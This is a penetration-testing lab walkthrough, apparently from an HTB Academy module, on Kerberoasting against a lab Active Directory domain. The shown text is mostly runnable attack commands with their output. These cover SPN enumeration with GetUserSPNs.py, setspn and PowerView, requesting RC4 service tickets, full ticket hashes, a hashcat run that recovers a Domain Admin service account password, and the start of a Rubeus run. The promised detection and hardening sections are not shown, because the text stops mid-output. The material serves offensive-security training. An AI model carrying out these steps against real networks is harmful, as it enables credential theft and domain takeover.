# 04 — Kerberoasting

> **Environment:** INLANEFREIGHT.LOCAL | DC: `172.16.5.5` | Attack host: Pwnbox (`ens224`)  
> **Objective:** Enumerate service accounts with SPNs, request TGS tickets for offline cracking, and recover cleartext service account passwords — ultimately escalating to Domain Admin.  
> **MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

---

## Table of Contents

1. [Root Cause](#root-cause)
2. [Attack Chain Overview](#attack-chain-overview)
3. [Lab Environment](#lab-environment)
4. [Phase 1 — SPN Enumeration from Linux (GetUserSPNs.py)](#phase-1--spn-enumeration-from-linux)
5. [Phase 2 — Request TGS Tickets for Offline Cracking](#phase-2--request-tgs-tickets-for-offline-cracking)
6. [Phase 3 — Hashcat Offline Cracking (Mode 13100)](#phase-3--hashcat-offline-cracking-mode-13100)
7. [Phase 4 — SPN Enumeration from Windows (setspn, PowerView)](#phase-4--spn-enumeration-from-windows)
8. [Phase 5 — Kerberoasting with Rubeus](#phase-5--kerberoasting-with-rubeus)
9. [RC4 vs AES Encryption — Impact on Crackability](#rc4-vs-aes-encryption)
10. [Post-Crack Validation and Privilege Escalation](#post-crack-validation)
11. [Detection Engineering](#detection-engineering)
12. [Defensive Hardening](#defensive-hardening)
13. [References](#references)

---

## Root Cause

Kerberoasting exploits a fundamental design property of Kerberos: **any authenticated domain user can request a Service Ticket (TGS) for any registered service**, regardless of whether they are authorised to use that service. The TGS ticket is encrypted with the service account's NTLM password hash. The attacker takes the encrypted ticket offline and attempts to crack the hash to recover the plaintext password.

**Why this exists:**

Kerberos was designed so that any domain user can discover and reach services. The TGS encryption uses the service account's secret key (derived from its password) so the service can verify the ticket's authenticity. The KDC does not restrict who can request tickets — it only controls what authorisations are embedded inside them.

The attack targets **user accounts with SPNs** rather than machine accounts:

- Machine accounts (`COMPUTERNAME$`) have 120-character randomly generated passwords — computationally infeasible to crack
- User accounts have passwords set by humans — far more likely to be predictable, dictionary-based, or policy-minimum-compliant

```
Kerberos TGS Request Flow (attacker perspective):
─────────────────────────────────────────────────

  Attacker (domain user: forend)
       │
       │ 1. AS-REQ (request TGT with forend credentials)
       ▼
  KDC (172.16.5.5)
       │
       │ 2. AS-REP (issue TGT encrypted with forend's key)
       ▼
  Attacker
       │
       │ 3. TGS-REQ (request TGS for MSSQL_svc_dev/inlanefreight.local:1433)
       │    "KDC, give me a ticket for the sqldev service"
       ▼
  KDC
       │
       │ 4. TGS-REP (issue TGS encrypted with sqldev's NTLM hash)
       │    KDC does not check if forend has rights to use the service
       ▼
  Attacker has TGS ticket encrypted with sqldev's password
       │
       │ 5. Offline hashcat crack → sqldev:database!
       ▼
  Domain Admin access (sqldev is a member of Domain Admins)
```

**Encryption type matters enormously:**

| Encryption Type | Hash Prefix         | Hashcat Mode | Crack Speed (GPU)    |
|-----------------|---------------------|-------------|----------------------|
| RC4 (etype 23)  | `$krb5tgs$23$*`     | `13100`     | ~800K–50M H/s        |
| AES-128 (etype 17) | `$krb5tgs$17$*`  | `19600`     | ~100–500K H/s        |
| AES-256 (etype 18) | `$krb5tgs$18$*`  | `19700`     | ~50–300K H/s         |

RC4 tickets crack orders of magnitude faster. Where AES is enforced and RC4 is still permitted as a backward-compatibility option, Rubeus `/tgtdeleg` can force a downgrade.

---

## Attack Chain Overview

```
  INLANEFREIGHT.LOCAL Kerberoasting Attack Chain
  ┌─────────────────────────────────────────────────────────────────────────────┐
  │                                                                             │
  │   STEP 1: Enumerate SPNs                                                   │
  │   ──────────────────────                                                   │
  │   GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend             │
  │   → 6 Kerberoastable accounts identified                                   │
  │   → sqldev (MSSQLSvc) → member of Domain Admins ← HIGH VALUE              │
  │   → BACKUPAGENT, SOLARWINDSMONITOR → Domain Admins                        │
  │                                                                             │
  │   STEP 2: Request TGS Tickets                                              │
  │   ───────────────────────────                                              │
  │   GetUserSPNs.py -request-user sqldev -outputfile sqldev_tgs              │
  │   → TGS ticket extracted: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...    │
  │   → RC4 encryption (etype 23) — crackable with hashcat                   │
  │                                                                             │
  │   STEP 3: Crack Offline                                                    │
  │   ─────────────────────                                                    │
  │   hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt           │
  │   → Status: Cracked in 10 seconds                                         │
  │   → sqldev:database!                                                       │
  │                                                                             │
  │   STEP 4: Validate & Escalate                                              │
  │   ────────────────────────────                                             │
  │   crackmapexec smb 172.16.5.5 -u sqldev -p database!                     │
  │   → [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)                    │
  │   → Domain Admin access confirmed                                          │
  │                                                                             │
  └─────────────────────────────────────────────────────────────────────────────┘
```

---

## Lab Environment

| Component             | Value                                            |
|-----------------------|--------------------------------------------------|
| Domain                | `INLANEFREIGHT.LOCAL`                            |
| Domain Controller     | `172.16.5.5` (ACADEMY-EA-DC01)                  |
| Attack Host           | Pwnbox — `ens224` interface                      |
| Credential Used       | `forend` (standard domain user)                  |
| High-Value SPNs Found | `sqldev`, `BACKUPAGENT`, `SOLARWINDSMONITOR`     |
| Cracked Credential    | `sqldev:database!`                               |
| Post-Crack Privilege  | Domain Admin (`Pwn3d!`)                          |

---

## Phase 1 — SPN Enumeration from Linux

### Method 1A — GetUserSPNs.py (List SPNs Only, No Ticket Request)

```bash
Hackerpatel007_1@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

```
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                                       Name                 MemberOf                                                       PasswordLastSet             LastLogon
---------------------------------------------------        -----------------    ---------------------------------------------------------------    --------------------------  ----------
backupjob/veam001.inlanefreight.local                      BACKUPAGENT          CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2022-02-15 17:15:40.842452  <never>
sts/inlanefreight.local                                    SOLARWINDSMONITOR    CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2022-02-15 17:14:48.701834  <never>
MSSQLSvc/SPSJDB.inlanefreight.local:1433                   sqlprod              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL             2022-02-15 17:09:46.326865  <never>
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351              sqlqa                CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL             2022-02-15 17:10:06.545598  <never>
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433              sqldev               CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2022-02-15 17:13:31.639334  <never>
adfsconnect/azure01.inlanefreight.local                    adfs                 CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups  2022-02-15 17:15:27.108079  <never>
```

**Analysis:**

6 Kerberoastable accounts identified. The `MemberOf` column is critical for prioritisation:

- **BACKUPAGENT** and **SOLARWINDSMONITOR** are both members of **Domain Admins** — if either password cracks, the domain is fully compromised
- **sqldev** (MSSQL service) is also a Domain Admin member — highest value target
- **sqlprod** and **sqlqa** are in Dev Accounts — lateral movement potential, not immediate DA
- **adfs** is in ExchangeLegacyInterop — may have high privileges within Exchange infrastructure

The `PasswordLastSet` values all from February 2022 and no `LastLogon` ever — these accounts may have weak, long-unchanged passwords. This is the classic service account antipattern.

**Flag breakdown:**
- `-dc-ip 172.16.5.5` — explicit Domain Controller IP (avoid DNS dependency)
- `INLANEFREIGHT.LOCAL/forend` — domain/username format; tool prompts for password
- No `-request` flag here — this is enumeration only, no TGS tickets requested yet

---

## Phase 2 — Request TGS Tickets for Offline Cracking

### Method 2A — Request All TGS Tickets at Once

```bash
Hackerpatel007_1@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

```
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                                   Name                   MemberOf                                                        PasswordLastSet             LastLogon
----------------------------------------------------   -----------------      ---------------------------------------------------------------    --------------------------  ----------
backupjob/veam001.inlanefreight.local                  BACKUPAGENT            CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2022-02-15 17:15:40.842452  <never>
sts/inlanefreight.local                                SOLARWINDSMONITOR      CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2022-02-15 17:14:48.701834  <never>
MSSQLSvc/SPSJDB.inlanefreight.local:1433               sqlprod                CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL             2022-02-15 17:09:46.326865  <never>
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351          sqlqa                  CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL             2022-02-15 17:10:06.545598  <never>
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433          sqldev                 CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL            2022-02-15 17:13:31.639334  <never>
adfsconnect/azure01.inlanefreight.local                adfs                   CN=ExchangeLegacyInterop                                       2022-02-15 17:15:27.108079  <never>

$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac06<SNIP>

$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efa<SNIP>
```

**Analysis:**

The `-request` flag causes GetUserSPNs.py to submit a TGS-REQ for every discovered SPN and output the resulting encrypted tickets in `$krb5tgs$23$*` format. All returned tickets use **etype 23** (RC4), indicating the accounts do not enforce AES-only encryption. This is the most crackable format.

Notice each ticket begins with `$krb5tgs$23$*` — the `23` is the etype identifier for RC4-HMAC. These hashes are directly compatible with Hashcat mode `13100`.

### Method 2B — Request Specific TGS Ticket and Save to File

Target only the highest-value account (sqldev = Domain Admin) for focused cracking:

```bash
Hackerpatel007_1@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

```
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                              Name       MemberOf                                                     PasswordLastSet             LastLogon
------------------------------------------------  ------     ---------------------------------------------------------------  --------------------------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433    sqldev     CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL          2022-02-15 17:13:31.639334  <never>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2<SNIP>
```

**Analysis:**

Using `-request-user sqldev` targets the specific high-value account rather than requesting tickets for all 6 accounts. This is operationally cleaner during authorised assessments. The `-outputfile sqldev_tgs` saves the hash to a file that Hashcat reads directly.

**Flag breakdown:**
- `-request` — trigger TGS ticket requests (without this, only SPN enumeration occurs)
- `-request-user sqldev` — request TGS for a single specified account
- `-outputfile sqldev_tgs` — write hash to file for offline cracking

---

## Phase 3 — Hashcat Offline Cracking (Mode 13100)

### Cracking the sqldev TGS Ticket

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

```
hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca425061494ac06dbd27fe6817ffb1404c1f:database!


Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
Time.Started.....: Tue Feb 15 17:44:49 2022, (10 secs)
Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8765440/14344386 (61.11%)
Rejected.........: 0/8765440 (0.00%)
Restore.Point....: 8749056/14344386 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius07 -> darten170

Started: Tue Feb 15 17:44:49 2022
Stopped: Tue Feb 15 17:45:41 2022
```

**Analysis:**

**Password cracked: `sqldev:database!`** — in 10 seconds against rockyou.txt at 821K H/s. This is the characteristic speed of RC4 TGS hashes on even modest hardware. On a modern GPU rig, RC4 Kerberoasting hashes crack at 50M–500M H/s.

The cracked password `database!` is a minimal-complexity password meeting Windows policy requirements (mixed case would be missing but `!` satisfies symbol requirement). This exemplifies the service account password antipattern: set once, never rotated, chosen by a human for memorability.

**Key stats to note:**
- `Status: Cracked` — hash fully recovered
- `Time.Started/Stopped` — 10 seconds total
- `Progress: 61.11%` — cracked well before exhausting rockyou.txt (8.7M of 14.3M entries)
- `Speed.#1: 821.3 kH/s` — per-second hash rate on the lab hardware

**Hashcat flag breakdown:**
- `-m 13100` — Kerberos 5, etype 23, TGS-REP (RC4 Kerberoasting mode)
- `sqldev_tgs` — input file containing the `$krb5tgs$23$*` hash
- `/usr/share/wordlists/rockyou.txt` — wordlist (use rules: `-r /usr/share/hashcat/rules/best64.rule` for harder targets)

---

## Phase 4 — SPN Enumeration from Windows

### Method 4A — setspn.exe (Built-In, No Tools Required)

```cmd
C:\htb> setspn.exe -Q */*
```

```
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
         exchangeAB/ACADEMY-EA-DC01
         exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

<SNIP>
```

**Analysis:** `setspn -Q */*` queries Active Directory for all registered SPNs. The `*/*` wildcard matches all service classes and hostnames. This is a built-in Windows binary that does not require any third-party tooling — useful when operating from a domain-joined host where dropping tools is undesirable. The output includes both machine accounts and user accounts; filter results by reviewing which are user objects versus computer objects.

### Method 4B — PowerView SPN Enumeration

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -SPN
```

```
logoncount              : 0
distinguishedname       : CN=krbtgt,CN=Users,DC=inlanefreight,DC=local
name                    : krbtgt
admincount              : 1
samaccountname          : krbtgt
serviceprincipalname    : kadmin/changepw

<SNIP>

samaccountname          : sqldev
serviceprincipalname    : MSSQL_svc_dev/inlanefreight.local:1433
```

**Analysis:** `Get-DomainUser -SPN` returns all user objects with a non-empty `servicePrincipalName` attribute. Unlike `setspn`, PowerView filters to user accounts only (not machine accounts), which is exactly what Kerberoasting targets. The full LDAP attributes are returned, including `admincount: 1` (indicating membership in protected groups via AdminSDHolder), which flags high-value targets immediately.

### Method 4C — PowerView Direct Kerberoasting (SPN Enumeration + Ticket Request)

```powershell
PS C:\Tools> Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
PS C:\Tools> cat .\tgs.csv
```

```
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"krbtgt","CN=krbtgt,CN=Users,DC=inlanefreight,DC=local","kadmin/changepw",,"$krb5tgs$18$*krbtgt$inlanefreight.local$kadmin/changepw*$B6D1ECE203852A04E57DFDD47627CDCA$<SNIP>"
"sqldev","CN=sqldev,OU=Service Accounts,OU=IT,...","MSSQL_svc_dev/inlanefreight.local:1443",,"$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1443*$29A78F89AC24EADBB4532DF066B90F1D808A5<SNIP>"
"sqlqa","CN=sqlqa,OU=Service Accounts,...","MSSQL_svc_qa/inlanefreight.local:1443",,"$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local:1443*$895B5A094F49081330D4AEA7C1254F37EEAD7<SNIP>"
"sql-test","CN=sql-test,OU=Service Accounts,...","MSSQL_svc_test/inlanefreight.local:1443",,"$krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local:1443*$68F3B21822B3C16D272F38A5658E20F580037<SNIP>"
"sqlprod","CN=sqlprod,OU=Service Accounts,...","MSSQLSvc/sql01:1433",,"$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01:1433*$EE29DA2458CA695EC2EDE568E9918909F7A05<SNIP>"
```

**Analysis:** The pipeline `Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv` performs the complete Kerberoasting workflow in a single command chain: enumerate all SPN accounts → request TGS tickets → format output for Hashcat → save to CSV. The `-format Hashcat` flag produces the `$krb5tgs$` format rather than John-the-Ripper format.

Notice `krbtgt` returns a `$krb5tgs$18$*` ticket (AES-256 — etype 18), while the SQL service accounts return `$krb5tgs$23$*` (RC4 — etype 23). Never crack krbtgt tickets in an assessment — it generates significant detection noise and cracking the krbtgt hash is not needed for domain compromise.

### Method 4D — Invoke-Kerberoast (All-In-One PowerView Function)

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Invoke-Kerberoast
```

```
SamAccountName      : adam.jones
ServicePrincipalName: IIS_dev/inlanefreight.local:80
Hash                : $krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local:80*$D7C42CD87BEF69BA275C9642BBEA9022BE3C1<SNIP>

SamAccountName      : sqldev
ServicePrincipalName: MSSQL_svc_dev/inlanefreight.local:1433
Hash                : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1443*$29A78F89AC24EADBB4532DF066B90F1D808A5<SNIP>

SamAccountName      : sqlqa
ServicePrincipalName: MSSQL_svc_qa/inlanefreight.local:1443
Hash                : $krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local:1443*$895B5A094F49081330D4AEA7C1254F37EEAD7<SNIP>

SamAccountName      : sql-test
ServicePrincipalName: MSSQL_svc_test/inlanefreight.local:1443
Hash                : $krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local:1443*$68F3B21822B3C16D272F38A5658E20F580037<SNIP>

SamAccountName      : sqlprod
ServicePrincipalName: MSSQLSvc/sql01:1433
Hash                : $krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01:1433*$EE29DA2458CA695EC2EDE568E9918909F7A05<SNIP>
```

---

## Phase 5 — Kerberoasting with Rubeus

Rubeus is the preferred tool for Kerberoasting from Windows — it offers fine-grained control over encryption type, targeting, and output format.

### Method 5A — Kerberoast All Accounts

```cmd
C:\Tools> Rubeus.exe kerberoast /nowrap
```

```
   ______        _
  (_____ \      | |
   _____) )_  _| |__ _____ _   _ ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for
    '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)
    (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 6

[*] SamAccountName               : sqldev
[*] DistinguishedName            : CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName         : MSSQL_svc_dev/inlanefreight.local:1433
[*] PwdLastSet                   : 10/14/2022 7:00:06 AM
[*] Supported ETypes             : RC4_HMAC_DEFAULT
[*] Hash                   :
